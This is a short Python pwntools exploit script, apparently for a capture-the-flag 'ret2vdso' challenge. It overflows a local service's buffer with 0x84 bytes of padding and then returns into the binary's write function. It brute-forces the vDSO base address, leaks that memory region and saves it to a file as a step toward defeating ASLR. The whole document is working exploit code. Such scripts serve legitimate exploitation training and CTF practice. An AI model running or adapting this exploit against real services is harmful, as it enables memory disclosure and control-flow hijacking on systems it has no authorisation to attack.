from pwn import *
context(os="linux", arch="i386")

context.log_level="debug"

elf = ELF("./ret2vdso")

vdso_rg = range(0xf7ec8000, 0xf7fc7000, 0x1000)

while True:
    vdso_base = random.choice(vdso_rg)
    payload = flat([
        b'A'*0x84, # padding
        elf.sym["write"], 0xdeadbeef,
        1, vdso_base, 0x2000
    ])
    io = remote("127.1", 7788)
    io.send(payload)
    try:
        io.recvuntil(payload, drop=False)
        data = io.recvall(0.1)
        if (len(data) != 0):
            with open("./vdso_x32.so", "wb") as f:
                f.write(data)
            log.success("Dump vdso.so successfully.")
            exit(0)
        io.close()
    except Exception as e:
        io.close()